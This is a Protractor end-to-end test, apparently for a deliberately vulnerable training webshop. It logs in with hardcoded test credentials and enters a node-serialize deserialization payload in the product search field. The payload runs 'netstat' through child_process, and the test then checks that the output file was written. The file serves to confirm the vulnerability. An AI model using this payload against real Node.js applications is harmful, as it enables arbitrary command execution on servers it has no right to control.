'use strict';
const path = require('path');
const glob = require("glob");
const HelperFunctions = require('./helperFunctions.js');

describe('Deserialization - Deserialization Bug', () => {

    beforeEach(() => {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(() => {
        HelperFunctions.logout(browser);
    });

    describe('Try to run netstat command', () => {

        beforeEach(() => {
            browser.get(browser.params.webshop);
        });

        it('should be successfully', () => {
            let fileName = 'deserializationBug.txt';

            //Fill form
            element(by.model('productSearch.searchValue')).sendKeys("_$$ND_FUNC$$_function (){require('child_process').exec('netstat>" + fileName + "'); }()");
            browser.actions().sendKeys(protractor.Key.ENTER).perform();

            let filePath = '../../' + fileName;

            browser.driver.wait(() => {
                let filesArray = glob.sync(path.join(__dirname, filePath));
                if (typeof filesArray !== 'undefined' && filesArray.length > 0) {
                    return filesArray;
                }
            }, 5000).then((filesArray) => {
                expect(filesArray[0]).toContain(fileName);
            });
        });
    });
});
